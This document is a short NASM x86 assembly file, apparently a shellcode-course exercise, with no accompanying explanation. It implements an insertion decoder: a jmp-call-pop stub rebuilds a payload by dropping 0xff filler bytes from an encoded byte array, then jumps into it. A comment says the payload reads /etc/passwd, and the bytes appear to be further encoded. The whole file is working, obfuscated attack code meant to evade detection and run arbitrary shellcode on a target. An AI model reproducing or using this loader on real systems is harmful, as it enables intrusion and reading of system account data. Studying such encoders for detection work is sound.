; Filename: insertion_decode.nasm
; read /etc/passwd


global _start

section .text
_start:
	jmp _shellcode


_decode_stub:
	pop ebx 		; ptr to encoded_shellcode
	xor ecx, ecx
	mov cl, 0x1
	xor eax, eax

_loop:
	; exit condition
	cmp al, 0x92				; size of shellcode 
	jz _execute

	mov dl, byte [ebx + ecx]		; mov next valid instruciton to dl
	mov byte [ebx + eax], dl		; move dl to shellcode
	inc ecx
	inc ecx
	inc eax
	jmp _loop


_execute:
	jmp ebx


; section .data						; need .data section to be writable
									; OR, compile with 'ld -N' to make .text sectiono not read-only
_shellcode:
	call _decode_stub
	encoded_shellcode: db 0xff, 0xdb, 0xff, 0xd8, 0xff, 0xba, 0xff, 0x83, 0xff, 0x39, 0xff, 0x67, 0xff, 0x22, 0xff, 0xd9, 0xff, 0x74, 0xff, 0x24, 0xff, 0xf4, 0xff, 0x58, 0xff, 0x29, 0xff, 0xc9, 0xff, 0xb1, 0xff, 0x13, 0xff, 0x83, 0xff, 0xe8, 0xff, 0xfc, 0xff, 0x31, 0xff, 0x50, 0xff, 0x14, 0xff, 0x03, 0xff, 0x50, 0xff, 0x97, 0xff, 0xdb, 0xff, 0x92, 0xff, 0xc9, 0xff, 0xa1, 0xff, 0xa3, 0xff, 0x58, 0xff, 0x0e, 0xff, 0xcd, 0xff, 0xd3, 0xff, 0x39, 0xff, 0x3f, 0xff, 0x04, 0xff, 0x1e, 0xff, 0x3d, 0xff, 0xb6, 0xff, 0x55, 0xff, 0x19, 0xff, 0x3d, 0xff, 0xc9, 0xff, 0x59, 0xff, 0x5a, 0xff, 0xcb, 0xff, 0x2e, 0xff, 0xd0, 0xff, 0xa3, 0xff, 0x71, 0xff, 0xb0, 0xff, 0xf2, 0xff, 0x53, 0xff, 0x86, 0xff, 0x7c, 0xff, 0x72, 0xff, 0xda, 0xff, 0x44, 0xff, 0xc6, 0xff, 0x76, 0xff, 0xdd, 0xff, 0x48, 0xff, 0x37, 0xff, 0xcd, 0xff, 0xdc, 0xff, 0x48, 0xff, 0x37, 0xff, 0x31, 0xff, 0x12, 0xff, 0xc8, 0xff, 0x8f, 0xff, 0x30, 0xff, 0xac, 0xff, 0xc9, 0xff, 0xef, 0xff, 0x89, 0xff, 0xac, 0xff, 0xc9, 0xff, 0xef, 0xff, 0xed, 0xff, 0x61, 0xff, 0x49, 0xff, 0x07, 0xff, 0x28, 0xff, 0x86, 0xff, 0xb5, 0xff, 0x27, 0xff, 0x9d, 0xff, 0x1c, 0xff, 0x3e, 0xff, 0xbb, 0xff, 0xce, 0xff, 0xae, 0xff, 0xdf, 0xff, 0x48, 0xff, 0x63, 0xff, 0x38, 0xff, 0x44, 0xff, 0xaf


